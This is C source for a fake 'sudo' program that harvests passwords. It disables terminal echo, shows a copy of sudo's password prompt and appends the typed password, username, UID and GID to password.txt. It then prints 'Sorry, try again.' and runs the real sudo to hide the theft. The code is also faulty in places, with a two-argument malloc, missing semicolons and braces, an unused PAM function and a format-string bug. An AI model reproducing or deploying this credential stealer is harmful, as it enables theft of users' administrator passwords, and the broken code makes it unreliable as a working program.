#define _POSIX_C_SOURCE 200809L
#include<stdio.h>
#include<unistd.h>
#include<termios.h>
#include<string.h>
#include<stdlib.h>
#include<security/pam_appl.h>
#include<security/pam_misc.h>

int pamconv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
    struct pam_response *reply = malloc(num_msg, sizeof(struct pam_response));
    if (!reply) return PAM_BUF_ERR;

    for (int i = 0;i < num_msg;i++) {
    if (msg[i]->msg_style == PAM_PROMPT_ECHO_OFF) {
        reply[i].resp = strdup((char *)appdata_ptr);
        reply[i].resp_retcode = 0;
    
    } else {
        reply[i].resp = NULL;
        reply[i].resp_retcode = 0;
    }
    *resp = reply
    return PAM_SUCCESS
};


int main(int argc,char *argv[]){
     if (argc < 2) {
        system("sudo");
        return 0;
    }

    // sudo ticket invalidation
    system("sudo -k");

    // variable declaration & structures
    struct termios old_t, new_t;
    char password[64];
    char cmdbuffer[1024] = "sudo "; 
    char *user = getlogin();
    char pwdbuf[128];

    // real command that will be executed
    for (int i = 1;i < argc;i++){
        strcat(cmdbuffer, argv[i]);
        strcat(cmdbuffer, " ");
    }

    // copy of the terminal file descriptor configuration 
    // and deactivation of the ECHO by reversing the fourth bit
    // in the bitmask of the configuration to mimic the sudo secure input  
    tcgetattr(STDIN_FILENO, &old_t);
    new_t = old_t;
    new_t.c_lflag &= ~ECHO;
    
    printf("[sudo] password for %s: ", user);
    fflush(stdout);

    // re-setting the old configuration so it doesn't bug anything
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_t);

    if (fgets(password, sizeof(password), stdin) != NULL) {
        password[strcspn(password, "\n")] = 0;
    };
    printf("\n");
    fflush(stdout);

    tcsetattr(STDIN_FILENO, TCSADRAIN, &old_t);
    

    FILE *f = fopen("password.txt", "a");

    snprintf(pwdbuf, sizeof(pwdbuf),"---\nuser: %s\npass: %s\nUID: %d GID: %d", user, password, getuid(), getgid());
    fprintf(f, pwdbuf);



    fclose(f);
    sleep(3);
    printf("Sorry, try again.\n");
    fflush(stdout);

    // execution of sudo with the real command
    system(cmdbuffer);
    
}